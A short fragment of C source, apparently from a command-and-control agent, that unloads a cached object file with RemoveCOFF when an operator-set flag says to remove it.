            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
            // TODO: server should keep BOF information stored locally for this

            if (!bof->b_cache) {
                RemoveCOFF(bof->bof_id);
            }
        }
    }
}
